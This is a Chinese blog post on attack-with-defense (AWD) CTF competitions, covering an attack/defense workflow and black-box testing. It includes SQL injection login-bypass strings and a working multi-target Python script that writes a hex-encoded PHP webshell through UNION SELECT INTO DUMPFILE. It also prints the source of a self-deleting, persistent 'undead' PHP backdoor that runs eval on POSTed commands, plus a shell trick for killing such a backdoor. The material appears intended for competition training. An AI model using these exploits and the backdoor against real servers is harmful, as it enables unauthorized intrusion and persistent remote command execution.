+<h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><p>1，先进行扫描操作，找到攻击目标。</p>
+<p>2，D盾扫描（找到后门清除）修改初始化口令等，</p>
+<p>3，攻击手利用脚本进行攻击，自动提交flag，注入不死马等</p>
+<p>4，防御手接着进行代码</p>
+<p>防御：</p>
+<p>如果被写入了不死马呢 这个时候，我们再回想一下，守护进程不是可以一直地监听端口，然后不断地fork服务么？这就相当于即使木马不断kill掉服务，它依然会被不断地重启。<br> 这种情况下我们就可以有一种骚操作了，我们先把&#x2F;bin&#x2F;bash给复制成与服务同名，覆盖掉原来的服务。（当然原来的服务肯定要先备份），大概就是下面三条命令就可以完成了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash ./game<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;kill -9 -1&quot;</span> | nc 127.0.0.1 2019 <br></code></pre></td></tr></table></figure>
+
+<p>这条命令类似于直接把kill -9 -1给发送过去，一旦fork game(实际是bash)，接着就会执行 kill -9  -1命令。这样就会在不死马把game（实际是bash）杀掉之前先把 test 用户的所有进程 kill  掉。这样一来，因为不死马也是test权限运行的，也被杀掉了。最后只要把备份好的服务重新替换回来就正常了。</p>
+<h2 id="3-黑盒测试"><a href="#3-黑盒测试" class="headerlink" title="3.黑盒测试"></a>3.黑盒测试</h2><p>前期利用后门+脚本得分，这只是其中一部分，比赛预制漏洞远不止此，在代发审计的同时，攻击手包括但不限于对以下常规漏洞进行测试：例如 <strong>sql注入，文件上传，文件包含，目录穿越</strong>等。</p>
+<h3 id="1-sql注入："><a href="#1-sql注入：" class="headerlink" title="1.sql注入："></a>1.sql注入：</h3><p>原因：sql注入的原因是没有对用户的输入内容做严格的把控，导致其可以改变原来的代码的功能。所以黑盒测试关键点也在于与数据库存在交互的地方。</p>
+<p>常见的与数据库交互的地方：</p>
+<p>1.登录界面</p>
+<p>2.调用参数的页面查询</p>
+<p>3.后台的可控参数等</p>
+<p>万能密码：</p>
+<p>（1）admin or 1&#x3D;1</p>
+<p>（2）admin’ or ‘1’&#x3D;’1</p>
+<p>  (3)admin” or 1&#x3D;1–</p>
+<p>(4)admin” or 1&#x3D;1#</p>
+<p>(5) ‘ or 1&#x3D;1&#x2F;*</p>
+<p>写马：</p>
+<p>以mysql为例：如果配置文件中的secure_file_priv为空的话，表示不限制mysqld在任意目录的导入导出</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304192001941.png" srcset="/img/loading.gif" lazyload></p>
+<p>sql注入漏洞利用脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br>lock=threading.Lock()<br><span class="hljs-built_in">dir</span> =<span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-comment">#这里为不死马被写入的路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_get_post</span>():<br>    lock.acquire(<span class="hljs-literal">True</span>) <span class="hljs-comment">#锁定</span><br>    <span class="hljs-keyword">global</span> payload <span class="hljs-comment">#下面payload根据实际情况判断是否是字符型注入</span><br>    payload= <span class="hljs-string">&quot;-1&#x27; union select 1,0x3c3f70687020406576616c28245f504f53545b636d645d293b203f3e,3 into dumpfile &#x27;d:\\phpstudy\\www\\ma\\file.php&#x27; --+&quot;</span><br>    <span class="hljs-keyword">global</span> data<br>    data=&#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span>:payload,<br>        <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span><br>    &#125; <span class="hljs-comment">#根据实际情况修改参数</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> url_head:<br>        url_undead=i.strip()+<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;file.php&#x27;</span> <span class="hljs-comment">#要写入的文件路径</span><br>        shell_url=i.strip()+shell_addr<br>        submit_undead_ma(shell_url)<br>        activate_undead_ma(url_undead)<br>    lock.release() <span class="hljs-comment">#释放</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_undead_ma</span>(<span class="hljs-params">shell_url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">type</span>)==<span class="hljs-number">1</span>):<br>            res=requests.get(shell_url,data,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            res=requests.post(shell_url,data,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> res.status_code==<span class="hljs-number">200</span>:<br>            result=shell_url+<span class="hljs-string">&quot;upload undead_ma success&quot;</span><br>            <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(shell_url+<span class="hljs-string">&quot;upload undead_ma fail&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(shell_url+<span class="hljs-string">&quot;connect shell fail&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">activate_undead_ma</span>(<span class="hljs-params">url_head1</span>):<br>    <span class="hljs-keyword">try</span>:<br>        res=requests.get(url_head1,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(url_head1+<span class="hljs-string">&quot;[-]不死马激活失败&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(url_head1+<span class="hljs-string">&quot;[+]不死马激活成功&quot;</span>)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    file=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ip.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>    url_head=file.readlines()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]请输入存在sql注入的漏洞地址 example：login.php&quot;</span>)<br>    shell_addr=<span class="hljs-built_in">input</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]请选择注入类型 1.get 2.post&quot;</span>)<br>    <span class="hljs-keyword">global</span> <span class="hljs-built_in">type</span><br>    <span class="hljs-built_in">type</span>=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    t=threading.Thread(target=prepare_get_post)<br>    t.start()<br></code></pre></td></tr></table></figure>
+
+<p>该脚本使用前要先通过order by 手工注入判断字段数，脚本中的十六进制是不死马代码的十六进制，(转换时需要将不死马集中到一行，这样才会生效)，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?php <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>); <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>); <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<span class="hljs-title function_ invoke__">file_put_contents</span>(.config.php<span class="hljs-string">&#x27;,&#x27;</span>&lt;?php <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])===<span class="hljs-string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);&#125;<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;);usleep(5000);?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/AWD/" class="category-chain-item">AWD</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4/">#攻击步骤</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>AWD攻击流程</div>
+      <div>http://example.com/2022/03/19/AWD攻击流程/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>March 19, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/04/09/CISCN%202019%20%E5%88%9D%E8%B5%9BLove%20Math/" title="CISCN  初赛Love Math">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CISCN  初赛Love Math</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/02/12/ctf.show_%E7%BA%A2%E5%8C%85%E9%A2%98/" title="ctf.show_红包题">
+                        <span class="hidden-mobile">ctf.show_红包题</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="http://140.210.217.83/" target="_blank" rel="nofollow noopener"><span>推荐</span></a> <i class="iconfont icon-love"></i> <a href="http://140.210.217.83/" target="_blank" rel="nofollow noopener"><span>博客</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
